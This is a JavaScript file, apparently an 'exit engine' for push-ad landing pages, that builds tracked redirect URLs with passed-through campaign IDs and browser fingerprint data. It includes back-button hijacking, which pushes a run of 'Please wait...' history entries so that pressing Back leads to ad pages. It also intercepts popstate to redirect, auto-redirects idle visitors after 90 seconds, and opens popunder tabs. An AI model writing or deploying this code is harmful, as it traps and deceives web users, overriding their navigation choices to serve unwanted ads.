/* common.js — CLEAN (Reels-friendly)
   - readable exit engine for Propush-like flows
   - supports: mainExit (currentTab/newTab), back queue (back.html), reverse, autoexit
   - builds AFU URLs with tracking passthrough (var_1/var_2/external_id/etc.)
   - DOES NOT hijack all clicks (to avoid breaking reels stage/swap)
*/

(() => {
  "use strict";

  // ---------------------------
  // Helpers
  // ---------------------------
  const safe = (fn) => { try { return fn(); } catch { return undefined; } };
  const log  = (...a) => safe(() => console.log("[common]", ...a));
  const err  = (...a) => safe(() => console.error("[common]", ...a));

  const replaceTo = (url) => {
    try { window.location.replace(url); }
    catch { window.location.href = url; }
  };

  const openTab = (url) => {
    try {
      const w = window.open(url, "_blank");
      if (w) { try { w.opener = null; } catch {} }
      return w || null;
    } catch {
      return null;
    }
  };

  // ---------------------------
  // URL snapshot + passthrough
  // ---------------------------
  const curUrl = new URL(window.location.href);
  const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;

  const IN = {
    // propush-ish / general
    pz: getSP("pz"),
    tb: getSP("tb"),
    tb_reverse: getSP("tb_reverse"),
    ae: getSP("ae"),
    z: getSP("z"),
    var: getSP("var"),
    var_1: getSP("var_1"),
    var_2: getSP("var_2"),
    var_3: getSP("var_3"),
    b: getSP("b"),
    campaignid: getSP("campaignid"),
    abtest: getSP("abtest"),
    rhd: getSP("rhd", "1"),
    s: getSP("s"),
    ymid: getSP("ymid"),
    wua: getSP("wua"),
    use_full_list_or_browsers: getSP("use_full_list_or_browsers"),
    cid: getSP("cid"),
    geo: getSP("geo"),

    // ExoClick tracking passthrough
    external_id: getSP("external_id"),
    creative_id: getSP("creative_id"),
    ad_campaign_id: getSP("ad_campaign_id"),
    cost: getSP("cost"),
  };

  const qsFromObj = (obj) => {
    const qs = new URLSearchParams();
    Object.entries(obj || {}).forEach(([k, v]) => {
      if (v != null && String(v) !== "") qs.set(k, String(v));
    });
    return qs;
  };

  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;

  let osVersionCached = "";
  (async () => {
    try {
      const nav = navigator;
      if (!nav.userAgentData?.getHighEntropyValues) return;
      const v = await nav.userAgentData.getHighEntropyValues(["platformVersion"]);
      osVersionCached = v?.platformVersion || "";
    } catch {}
  })();

  const buildCmeta = () => {
    try {
      const html = document.documentElement;
      const payload = {
        dataVer: html.getAttribute("data-version") || html.dataset.version || "",
        landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
        templateHash: window.templateHash || "",
      };
      return btoa(JSON.stringify(payload));
    } catch {
      return "";
    }
  };

  // ---------------------------
  // Config normalizer (APP_CONFIG -> cfg.exits)
  // ---------------------------
  const normalizeConfig = (appCfg) => {
    if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;

    const cfg = { domain: appCfg.domain };
    const ensure = (name) => (cfg[name] ||= {});

    Object.entries(appCfg).forEach(([k, v]) => {
      if (v == null || v === "" || k === "domain") return;

      // name_currentTab_zoneId / name_newTab_zoneId / name_currentTab_url / name_newTab_url
      let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
      if (m) {
        const [, name, tab, field] = m;
        const ex = ensure(name);
        (ex[tab] ||= {});
        ex[tab].domain = ex[tab].domain || (field === "zoneId" ? cfg.domain : undefined);
        ex[tab][field] = v;
        return;
      }

      // name_count / name_timeToRedirect / name_pageUrl
      m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
      if (m) {
        ensure(m[1])[m[2]] = v;
        return;
      }

      // shorthand: name_zoneId / name_url (assume currentTab; tabUnderClick -> newTab)
      m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
      if (m) {
        const [, name, field] = m;
        const ex = ensure(name);
        const tab = (name === "tabUnderClick") ? "newTab" : "currentTab";
        (ex[tab] ||= {});
        ex[tab].domain = ex[tab].domain || (field === "zoneId" ? cfg.domain : undefined);
        ex[tab][field] = v;
      }
    });

    return cfg;
  };

  // ---------------------------
  // Exit QS + AFU builders
  // ---------------------------
  const buildExitQS = ({ zoneId }) => {
    const ab2r = IN.abtest || (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");

    const base = {
      // base mapping (keep consistent with what you already pass)
      ymid: IN.var_1 || IN.var || "",
      var: IN.var_2 || IN.z || "",
      var_3: IN.var_3 || "",

      b: IN.b || "",
      campaignid: IN.campaignid || "",
      click_id: IN.s || "",
      rhd: IN.rhd || "1",

      os_version: osVersionCached || "",
      btz: getTimezoneName(),
      bto: String(getTimezoneOffset()),
      cmeta: buildCmeta(),

      pz: IN.pz || "",
      tb: IN.tb || "",
      tb_reverse: IN.tb_reverse || "",
      ae: IN.ae || "",
      ab2r,

      // tracking passthroughs
      external_id: IN.external_id || "",
      creative_id: IN.creative_id || "",
      ad_campaign_id: IN.ad_campaign_id || "",
      cost: IN.cost || "",
    };

    if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
    return qsFromObj(base);
  };

  const generateAfuUrl = (zoneId, domain) => {
    const host = String(domain || "").trim();
    if (!host) return "";
    const base = host.startsWith("http") ? host : `https://${host}`;
    const url = new URL(base.replace(/\/+$/, "") + "/afu.php");
    url.search = buildExitQS({ zoneId }).toString();
    return url.toString();
  };

  // direct URL passthrough (for *_url exits if you ever use them)
  const buildDirectUrlWithTracking = (baseUrl) => {
    try {
      const u = new URL(String(baseUrl), window.location.href);

      // pass-through landing params if missing on target
      for (const [k, v] of curUrl.searchParams.entries()) {
        if (!u.searchParams.has(k) && v != null && String(v) !== "") u.searchParams.set(k, v);
      }

      // enforce priority tracking
      const external_id = IN.external_id || "";
      const ad_campaign_id = IN.ad_campaign_id || IN.var_2 || "";
      const creative_id = IN.creative_id || "";
      const cost = IN.cost || IN.b || "";

      if (cost) u.searchParams.set("cost", cost);
      if (!u.searchParams.has("currency")) u.searchParams.set("currency", "usd");
      if (external_id) u.searchParams.set("external_id", external_id);
      if (creative_id) u.searchParams.set("creative_id", creative_id);
      if (ad_campaign_id) u.searchParams.set("ad_campaign_id", ad_campaign_id);

      return u.toString();
    } catch {
      return String(baseUrl || "");
    }
  };

  // ---------------------------
  // Back queue (back.html?z&domain OR back.html?url)
  // ---------------------------
  const pushBackStates = (url, count) => {
    try {
      const n = Math.max(0, parseInt(count, 10) || 0);
      const originalUrl = window.location.href;
      for (let i = 0; i < n; i++) window.history.pushState(null, "Please wait...", url);
      window.history.pushState(null, document.title, originalUrl);
    } catch (e) {
      err("Back pushState error:", e);
    }
  };

  const getDefaultBackHtmlUrl = () => {
    const { origin, pathname } = window.location;
    let dir = pathname.replace(/\/(index|back)\.html$/i, "");
    if (dir.endsWith("/")) dir = dir.slice(0, -1);
    if (!dir) return `${origin}/back.html`;
    return `${origin}${dir}/back.html`;
  };

  const initBack = async (cfg) => {
    const b = cfg?.back?.currentTab;
    if (!b) return;

    const count = cfg.back?.count ?? 10;
    const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
    const page = new URL(pageUrl, window.location.href);

    const qs = buildExitQS({ zoneId: b.zoneId });

    if (b.url) qs.set("url", String(b.url));
    else {
      qs.set("z", String(b.zoneId));
      qs.set("domain", String(b.domain || cfg.domain || ""));
    }

    page.search = qs.toString();
    pushBackStates(page.toString(), count);
  };

  // ---------------------------
  // Exit runners
  // ---------------------------
  const resolveUrl = (ex, cfg) => {
    if (!ex) return "";
    if (ex.url) return buildDirectUrlWithTracking(ex.url);
    if (ex.zoneId && (ex.domain || cfg?.domain)) return generateAfuUrl(ex.zoneId, ex.domain || cfg.domain);
    return "";
  };

  const runExitCurrentTab = async (cfg, name, withBack = true) => {
    const ex = cfg?.[name]?.currentTab;
    if (!ex) return;

    const url = resolveUrl(ex, cfg);
    if (!url) return;

    safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));

    if (withBack) {
      await initBack(cfg);
      setTimeout(() => replaceTo(url), 40);
    } else {
      replaceTo(url);
    }
  };

  const runExitDualTabs = async (cfg, name, withBack = true) => {
    const ex = cfg?.[name];
    if (!ex) return;

    const ctUrl = resolveUrl(ex.currentTab, cfg);
    const ntUrl = resolveUrl(ex.newTab, cfg);

    safe(() => {
      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ex.currentTab?.zoneId || ex.currentTab?.url });
      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: ex.newTab?.zoneId || ex.newTab?.url });
    });

    if (withBack) await initBack(cfg);
    if (ntUrl) openTab(ntUrl);
    if (ctUrl) setTimeout(() => replaceTo(ctUrl), 40);
  };

  const run = async (cfg, name) => {
    if (!cfg) return;
    if (cfg?.[name]?.newTab) return runExitDualTabs(cfg, name, true);
    return runExitCurrentTab(cfg, name, true);
  };

  // ---------------------------
  // Reverse + Autoexit
  // ---------------------------
  const initReverse = (cfg) => {
    if (!cfg?.reverse?.currentTab) return;

    safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
    window.addEventListener("popstate", (e) => {
      if (e?.state && e.state.__rev === 1) runExitCurrentTab(cfg, "reverse", false);
    });
  };

  const initAutoexit = (cfg) => {
    if (!cfg?.autoexit?.currentTab) return;

    const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
    let armed = false;

    const trigger = () => {
      if (document.visibilityState === "visible" && armed) runExitCurrentTab(cfg, "autoexit", true);
    };

    const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);

    const cancel = () => {
      clearTimeout(timer);
      document.removeEventListener("visibilitychange", trigger);
    };

    document.addEventListener("visibilitychange", trigger);
    ["mousemove", "click", "scroll"].forEach(ev =>
      document.addEventListener(ev, cancel, { once: true })
    );
  };

  // ---------------------------
  // Boot
  // ---------------------------
  const boot = () => {
    if (typeof window.APP_CONFIG === "undefined") {
      err("MISSING APP_CONFIG");
      return;
    }

    const cfg = normalizeConfig(window.APP_CONFIG);
    if (!cfg) {
      err("Bad APP_CONFIG (domain required)");
      return;
    }

    // expose API
    window.LANDING_EXITS = {
      cfg,
      run: (name) => run(cfg, name),
      initBack: () => initBack(cfg),
      // convenience
      mainExit: () => run(cfg, "mainExit"),
    };

    initAutoexit(cfg);
    initReverse(cfg);

    log("boot ok");
  };

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else boot();
})();
